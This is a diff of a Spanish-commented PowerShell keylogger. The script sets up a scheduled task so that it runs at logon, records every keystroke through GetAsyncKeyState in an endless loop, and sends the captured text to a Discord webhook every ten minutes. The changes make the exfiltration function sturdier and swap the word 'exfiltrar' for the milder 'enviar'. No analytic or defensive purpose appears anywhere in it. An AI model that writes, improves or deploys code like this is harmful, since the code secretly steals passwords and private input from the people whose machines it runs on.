@@ -19,24 +19,30 @@ if (-not $task) {
     Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User $env:USERNAME -Description "Ejecuta logger.ps1 al iniciar sesión del usuario actual" -Force
 }
 
-# FUNCIÓN MEJORADA PARA ENVIAR DATOS A DISCORD
+# FUNCIÓN ROBUSTA PARA ENVIAR A DISCORD
 function Send-ToDiscord {
     param ($content)
 
-    if (-not $content) { return $false }
+    if (-not $content -or $content.Trim() -eq "") { return $false }
 
-    # Divide el contenido en partes de hasta 1900 caracteres
-    $chunks = $content -split "(.{1,1900})(?=\s|$)"
+    # Divide en fragmentos seguros
+    $chunks = $content -split "(.{1,1800})(?=\s|$)"
     $success = $false
 
     foreach ($chunk in $chunks) {
+        $chunk = $chunk.Trim()
+        if ($chunk -eq "") { continue }
+
+        # Construcción manual de JSON escapado
+        $json = '{"content": "' + ($chunk -replace '"','\"' -replace "`r?`n"," ") + '"}'
+
         try {
-            $body = @{ content = $chunk } | ConvertTo-Json -Compress
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json' -ErrorAction Stop
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $json -ContentType 'application/json' -ErrorAction Stop
             $success = $true
         } catch {
             Add-Content -Path $logFile -Value "[$(Get-Date)] ERROR al enviar a Discord: $_"
         }
+
         Start-Sleep -Milliseconds 300
     }
 
@@ -53,9 +59,9 @@ public class Keyboard {
 }
 "@
 
-# INICIAR LOOP INFINITO
+# LOOP INFINITO
 while ($true) {
-    # CAPTURAR TECLAS
+    # REGISTRAR TECLAS
     for ($i = 1; $i -le 255; $i++) {
         $keyState = [Keyboard]::GetAsyncKeyState($i)
         if ($keyState -eq -32767) {
@@ -66,7 +72,7 @@ while ($true) {
         }
     }
 
-    # EXFILTRAR CADA 10 MINUTOS (ajustable luego a 120)
+    # ENVIAR CADA 10 MINUTOS (ajustable a 120)
     $now = Get-Date
     $lastSend = if (Test-Path $lastSendFile) { Get-Content $lastSendFile | Get-Date } else { $now.AddHours(-3) }
 
